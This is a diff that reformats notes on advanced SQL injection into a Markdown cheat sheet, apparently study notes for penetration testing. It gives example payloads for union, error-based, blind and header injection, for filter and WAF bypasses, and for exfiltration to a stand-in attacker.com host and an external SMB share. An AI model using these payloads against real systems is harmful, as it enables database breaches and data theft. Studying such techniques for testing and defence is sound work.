@@ -1,83 +1,174 @@
+## 💉 In-Band SQL Injection
 
-
-
-
-In-band SQL Injection
 
 This technique is considered the most common and straightforward type of SQL injection attack. In this technique, the attacker uses the same communication channel for both the injection and the retrieval of data. There are two primary types of in-band SQL injection:
 
-Error-Based SQL Injection: The attacker manipulates the SQL query to produce error messages from the database. These error messages often contain information about the database structure, which can be used to exploit the database further. Example: SELECT * FROM users WHERE id = 1 AND 1=CONVERT(int, (SELECT @@version)). If the database version is returned in the error message, it reveals information about the database.
-Union-Based SQL Injection: The attacker uses the UNION SQL operator to combine the results of two or more SELECT statements into a single result, thereby retrieving data from other tables. Example: SELECT name, email FROM users WHERE id = 1 UNION ALL SELECT username, password FROM admin.
-Inferential (Blind) SQL Injection
+* **Error-Based SQL Injection:** The attacker manipulates the SQL query to produce error messages from the database. These error messages often contain information about the database structure, which can be used to exploit the database further. 
+```sql
+# Induce a type conversion error to extract database version
+SELECT * FROM users WHERE id = 1 AND 1=CONVERT(int, (SELECT @@version));
+```
+* Tool: SQL Database / Error-Based Payload
+
+* **Union-Based SQL Injection:** The attacker uses the UNION SQL operator to combine the results of two or more SELECT statements into a single result, thereby retrieving data from other tables.
+```sql
+# Append administrator credentials to standard user query results
+SELECT name, email FROM users WHERE id = 1 UNION ALL SELECT username, password FROM admin;
+```
+* Tool: SQL Database / Union-Based Payload
+
+## 🦯 Inferential (Blind) SQL Injection
+
 
 Inferential SQL injection does not transfer data directly through the web application, making exploiting it more challenging. Instead, the attacker sends payloads and observes the application’s behaviour and response times to infer information about the database. There are two primary types of inferential SQL injection:
 
-Boolean-Based Blind SQL Injection: The attacker sends an SQL query to the database, forcing the application to return a different result based on a true or false condition. By analysing the application’s response, the attacker can infer whether the payload was true or false. Example: SELECT * FROM users WHERE id = 1 AND 1=1 (true condition) versus SELECT * FROM users WHERE id = 1 AND 1=2 (false condition). The attacker can infer the result if the page content or behaviour changes based on the condition.
-Time-Based Blind SQL Injection: The attacker sends an SQL query to the database, which delays the response for a specified time if the condition is true. By measuring the response time, the attacker can infer whether the condition is true or false. For example, SELECT * FROM users WHERE id = 1; IF (1=1) WAITFOR DELAY '00:00:05'--. If the response is delayed by 5 seconds, the attacker can infer that the condition was true.
+* **Boolean-Based Blind SQL Injection:** The attacker sends an SQL query to the database, forcing the application to return a different result based on a true or false condition. By analysing the application’s response, the attacker can infer whether the payload was true or false.
+```sql
+# Evaluate application response changes based on true vs false conditions
+SELECT * FROM users WHERE id = 1 AND 1=1; -- True condition
+SELECT * FROM users WHERE id = 1 AND 1=2; -- False condition
+```
+* Tool: SQL Database / Boolean-Based Payload
 
-Character Encoding
+* **Time-Based Blind SQL Injection:** The attacker sends an SQL query to the database, which delays the response for a specified time if the condition is true. By measuring the response time, the attacker can infer whether the condition is true or false.
+
+```sql
+# Force a 5-second server delay if the injected condition evaluates to true
+SELECT * FROM users WHERE id = 1; IF (1=1) WAITFOR DELAY '00:00:05'--;
+```
+* Tool: SQL Database / Time-Based Payload
+
+## 🔣 Character Encoding
+
 Character encoding involves converting special characters in the SQL injection payload into encoded forms that may bypass input filters.
 
-URL Encoding: URL encoding is a common method where characters are represented using a percent (%) sign followed by their ASCII value in hexadecimal. For example, the payload ' OR 1=1-- can be encoded as %27%20OR%201%3D1--. This encoding can help the input pass through web application filters and be decoded by the database, which might not recognise it as malicious during initial processing.
-Hexadecimal Encoding: Hexadecimal encoding is another effective technique for constructing SQL queries using hexadecimal values. For instance, the query SELECT * FROM users WHERE name = 'admin' can be encoded as SELECT * FROM users WHERE name = 0x61646d696e. By representing characters as hexadecimal numbers, the attacker can bypass filters that do not decode these values before processing the input.
-Unicode Encoding: Unicode encoding represents characters using Unicode escape sequences. For example, the string admin can be encoded as \u0061\u0064\u006d\u0069\u006e. This method can bypass filters that only check for specific ASCII characters, as the database will correctly process the encoded input.
+* **URL Encoding:** A common method where characters are represented using a percent sign followed by their ASCII value in hexadecimal. This encoding can help the input pass through web application filters and be decoded by the database, which might not recognise it as malicious during initial processing.
+```text
+# URL encode standard payload to bypass basic WAF signatures
+Original: ' OR 1=1--
+Encoded:  %27%20OR%201%3D1--
+```
+* Tool: Web Application Payload / URL Encoder
 
+* **Hexadecimal Encoding:** An effective technique for constructing SQL queries using hexadecimal values to bypass filters that do not decode these values before processing the input.
+```sql
+# Use hex encoding for string literal 'admin'
+SELECT * FROM users WHERE name = 0x61646d696e;
+```
+* Tool: SQL Database / Hex Encoder
 
-No-Quote SQL Injection
+* **Unicode Encoding:** Represents characters using Unicode escape sequences. This method can bypass filters that only check for specific ASCII characters, as the database will correctly process the encoded input.
+```text
+# Unicode encode string literal 'admin'
+\u0061\u0064\u006d\u0069\u006e
+```
+* Tool: Web Application Payload / Unicode Encoder
+
+## 🚫 No-Quote SQL Injection
 
 No-Quote SQL injection techniques are used when the application filters single or double quotes or escapes.
 
-Using Numerical Values: One approach is to use numerical values or other data types that do not require quotes. For example, instead of injecting ' OR '1'='1, an attacker can use OR 1=1 in a context where quotes are not necessary. This technique can bypass filters that specifically look for an escape or strip out quotes, allowing the injection to proceed.
-Using SQL Comments: Another method involves using SQL comments to terminate the rest of the query. For instance, the input admin'-- can be transformed into admin--, where the -- signifies the start of a comment in SQL, effectively ignoring the remainder of the SQL statement. This can help bypass filters and prevent syntax errors.
-Using CONCAT() Function: Attackers can use SQL functions like CONCAT() to construct strings without quotes. For example, CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e) constructs the string admin. The CONCAT() function and similar methods allow attackers to build strings without directly using quotes, making it harder for filters to detect and block the payload.
-No Spaces Allowed
+* **Using Numerical Values:** Use numerical values or other data types that do not require quotes. This technique can bypass filters that specifically look for an escape or strip out quotes.
+```sql
+# Inject logical OR condition without using string quotes
+OR 1=1
+```
+* Tool: SQL Database / Injection Payload
+
+* **Using SQL Comments:** Use SQL comments to terminate the rest of the query, effectively ignoring the remainder of the SQL statement to bypass filters and prevent syntax errors.
+```sql
+# Use comment syntax to truncate the original query
+admin--
+```
+* Tool: SQL Database / Comment Payload
+
+* **Using CONCAT() Function:** Attackers can use SQL functions like CONCAT() to construct strings without quotes, making it harder for filters to detect and block the payload.
+```sql
+# Construct the string 'admin' dynamically using hexadecimal concatenation
+CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)
+```
+* Tool: SQL Database / CONCAT Function
+
+## 🌌 No Spaces Allowed
 
 When spaces are not allowed or are filtered out, various techniques can be used to bypass this restriction.
 
-Comments to Replace Spaces: One common method is to use SQL comments (/**/) to replace spaces. For example, instead of SELECT * FROM users WHERE name = 'admin', an attacker can use SELECT/**/*FROM/**/users/**/WHERE/**/name/**/='admin'. SQL comments can replace spaces in the query, allowing the payload to bypass filters that remove or block spaces.
-Tab or Newline Characters: Another approach is using tab (\t) or newline (\n) characters as substitutes for spaces. Some filters might allow these characters, enabling the attacker to construct a query like SELECT\t*\tFROM\tusers\tWHERE\tname\t=\t'admin'. This technique can bypass filters that specifically look for spaces.
-Alternate Characters: One effective method is using alternative URL-encoded characters representing different types of whitespace, such as %09 (horizontal tab), %0A (line feed), %0C (form feed), %0D (carriage return), and %A0 (non-breaking space). These characters can replace spaces in the payload. 
+* **Comments to Replace Spaces:** Use SQL inline comments to replace spaces, allowing the payload to bypass filters that remove or block standard space characters.
+```sql
+# Substitute spaces with inline block comments
+SELECT/**/*FROM/**/users/**/WHERE/**/name/**/='admin';
+```
+* Tool: SQL Database / Inline Comments
 
-HTTP Requests
+* **Tab or Newline Characters:** Use tab or newline characters as substitutes for spaces. Some filters might allow these characters.
+```sql
+# Substitute spaces with tab characters
+SELECT\t*\tFROM\tusers\tWHERE\tname\t=\t'admin';
+```
+* Tool: SQL Database / Tab Substitution
 
-By leveraging database functions that allow HTTP requests, attackers can send sensitive data directly to a web server they control. This method exploits database functionalities that can make outbound HTTP connections. Although MySQL and MariaDB do not natively support HTTP requests, this can be done through external scripts or User Defined Functions (UDFs) if the database is configured to allow such operations.
+* **Alternate Characters:** Use alternative URL-encoded characters representing different types of whitespace, such as %09 (horizontal tab), %0A (line feed), %0C (form feed), %0D (carriage return), and %A0 (non-breaking space).
 
-First, the UDF needs to be created and installed to support HTTP requests. This setup is complex and usually involves additional configuration. An example query would look like SELECT http_post('http://attacker.com/exfiltrate', sensitive_data) FROM books;.
+## 📤 Data Exfiltration Techniques
 
-HTTP request exfiltration can be implemented on Windows and Linux (Ubuntu) systems, depending on the database's support for external scripts or UDFs that enable HTTP requests.
+By leveraging database functions that allow external connections, attackers can send sensitive data directly to a server they control.
 
-DNS Exfiltration 
+* **HTTP Requests:** Exploits database functionalities that can make outbound HTTP connections (often via UDFs or external scripts if configured).
+```sql
+# Exfiltrate data via HTTP POST request using a User-Defined Function
+SELECT http_post('[http://attacker.com/exfiltrate](http://attacker.com/exfiltrate)', sensitive_data) FROM books;
+```
+* Tool: SQL Database / HTTP UDF
 
-Attackers can use SQL queries to generate DNS requests with encoded data, which is sent to a malicious DNS server controlled by the attacker. This technique bypasses HTTP-based monitoring systems and leverages the database's ability to perform DNS lookups.
+* **DNS Exfiltration:** Generates DNS requests with encoded data sent to a malicious DNS server. This bypasses HTTP-based monitoring systems.
 
-As discussed above, MySQL does not natively support generating DNS requests through SQL commands alone, attackers might use other means such as custom User-Defined Functions (UDFs) or system-level scripts to perform DNS lookups.
+* **SMB Exfiltration:** Writing query results to an SMB share on an external server. Highly effective in Windows environments but also configurable in Linux (e.g., Ubuntu).
+```sql
+# Export query results to an external attacker-controlled SMB share
+SELECT sensitive_data INTO OUTFILE '\\\\10.10.162.175\\logs\\out.txt';
+```
+* Tool: SQL Database / INTO OUTFILE (SMB)
 
-SMB Exfiltration
+## ⚠️ Important Configuration Consideration
 
-SMB exfiltration involves writing query results to an SMB share on an external server. This technique is particularly effective in Windows environments but can also be configured in Linux systems with the right setup. an example query would look like SELECT sensitive_data INTO OUTFILE '\\\\10.10.162.175\\logs\\out.txt';.
+It is important to note that the MySQL system variable secure_file_priv may be set, mitigating the risk of unauthorised file operations.
 
-This is fully supported as Windows natively supports SMB/UNC paths. Linux (Ubuntu): While direct UNC paths are more native to Windows, SMB shares can be mounted and accessed in Linux using tools like smbclient or by mounting the share to a local directory. Directly using UNC paths in SQL queries may require additional setup or scripts to facilitate the interaction.
+* **When secure_file_priv is Set:** MySQL will restrict file operations such as INTO OUTFILE to the specified directory, limiting the ability to exfiltrate data to arbitrary locations.
+* **When secure_file_priv is Empty:** MySQL does not impose any directory restrictions, allowing files to be written to any directory accessible by the MySQL server process. This poses a high risk.
 
+## 🕵️ HTTP Header Injection
 
-Important Consideration
+HTTP headers can carry user input, which might be used in SQL queries on the server side. If these inputs are not sanitised, it can lead to SQL injection via headers like User-Agent, Referer, or X-Forwarded-For.
 
-It is important to note that the MySQL system variable secure_file_priv may be set. When set, this variable contains a directory pathname, and MySQL will only allow files to be written to this specified directory. This security measure helps mitigate the risk of unauthorised file operations. 
+```http
+# Inject SQL payload via the HTTP User-Agent header
+User-Agent: ' OR 1=1; --
+```
+* Tool: HTTP Client / Header Injection Payload
 
-When secure_file_priv is Set: MySQL will restrict file operations such as INTO OUTFILE to the specified directory. This means attackers can only write files to this directory, limiting their ability to exfiltrate data to arbitrary locations.
-When secure_file_priv is Empty: If the secure_file_priv variable is empty, MySQL does not impose any directory restrictions, allowing files to be written to any directory accessible by the MySQL server process. This configuration poses a higher risk as it provides more flexibility for attackers.
+## 🎯 Pentester Strategies
 
-HTTP Header Injection
+* **Exploiting Database-Specific Features:** Understand specifics of the target DBMS (MySQL, PostgreSQL, Oracle, MSSQL). For instance, MSSQL supports the xp_cmdshell command to execute system commands.
+* **Leveraging Error Messages:** Provoke error messages that reveal structural insights.
+```sql
+# Extract version information through engineered type mismatch error
+1' AND 1=CONVERT(int, (SELECT @@version)) --
+```
+* Tool: SQL Database / Error Extraction
 
-HTTP headers can carry user input, which might be used in SQL queries on the server side. user-agent injectionIf these inputs are not sanitised, it can lead to SQL injection. The technique involves manipulating HTTP headers (like User-Agent, Referer, or X-Forwarded-For) to inject SQL commands. The server might log these headers or use them in SQL queries. For example, a malicious User-Agent header would look like User-Agent: ' OR 1=1; --. If the server includes the User-Agent header in an SQL query without sanitising it, it can result in SQL injection.
+* **Bypassing WAF and Filters:** Test obfuscation techniques including mixed case, alternate encodings, inline comments, and concatenation.
+```sql
+# Use ASCII character concatenation to evade basic string matching
+CONCAT(CHAR(83), CHAR(69), CHAR(76), CHAR(69), CHAR(67), CHAR(84))
+```
+* Tool: SQL Database / WAF Bypass Payload
 
+* **Database Fingerprinting:** Determine the type and version of the database to tailor the attack.
+```sql
+# DBMS-specific version fingerprinting queries
+SELECT version(); -- PostgreSQL
+SELECT @@version; -- MySQL and MSSQL
+```
+* Tool: SQL Database / Fingerprinting Payload
 
-Pentesters
-
-Exploiting Database-Specific Features: Different database management systems (DBMS) have unique features and syntax. A pentester should understand the specifics of the target DBMS (e.g., MySQL, PostgreSQL, Oracle, MSSQL) to exploit these features effectively. For instance, MSSQL supports the xp_cmdshell command, which can be used to execute system commands.
-Leveraging Error Messages: Exploit verbose error messages to gain insights into the database schema and structure. Error-based SQL injection involves provoking the application to generate error messages that reveal useful information. For example, using 1' AND 1=CONVERT(int, (SELECT @@version)) -- can generate errors that leak version information.
-Bypassing WAF and Filters: Test various obfuscation techniques to bypass Web Application Firewalls (WAF) and input filters. This includes using mixed case (SeLeCt), concatenation (CONCAT(CHAR(83), CHAR(69), CHAR(76), CHAR(69), CHAR(67), CHAR(84))), and alternate encodings (hex, URL encoding). Additionally, using inline comments (/**/) and different character encodings (e.g., %09, %0A) can help bypass simple filters.
-Database Fingerprinting: Determine the type and version of the database to tailor the attack. This can be done by sending specific queries that yield different results depending on the DBMS. For instance, SELECT version() works on PostgreSQL, while SELECT @@version works on MySQL and MSSQL.
-Pivoting with SQL Injection: Use SQL injection to pivot and exploit other parts of the network. Once a database server is compromised, it can be used to gain access to other internal systems. This might involve extracting credentials or exploiting trust relationships between systems.
-
-
-
+* **Pivoting with SQL Injection:** Use the compromised database server to pivot and gain access to other internal systems, extract credentials, or exploit trust relationships.
